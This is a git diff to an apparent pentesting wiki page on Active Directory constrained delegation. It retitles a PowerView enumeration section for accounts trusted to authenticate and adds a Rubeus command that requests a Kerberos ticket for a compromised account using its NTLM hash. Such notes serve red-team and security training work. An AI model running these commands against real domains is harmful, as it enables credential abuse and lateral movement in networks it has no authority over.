@@ -17,7 +17,7 @@ Contrained Delegation can be used on both **Users and Computers Objects**
 
 ![](../../../../.gitbook/assets/image%20%28312%29.png)
 
-### powerview 
+### Powerview Enumeration 
 
 ```csharp
 Get-DomainUser -TrustedToAuth
@@ -25,4 +25,12 @@ Get-DomainComputer -TrustedToAuth
 ```
 
 ![](../../../../.gitbook/assets/image%20%28294%29.png)
+
+### Rubeus
+
+#### Request a TGT for the compromised account
+
+```csharp
+.\Rubeus.exe asktgt /user:web01 /domain:crook.badcorp.local /rc4:<NTLM Hash> /outfile:t.kirbi
+```
 
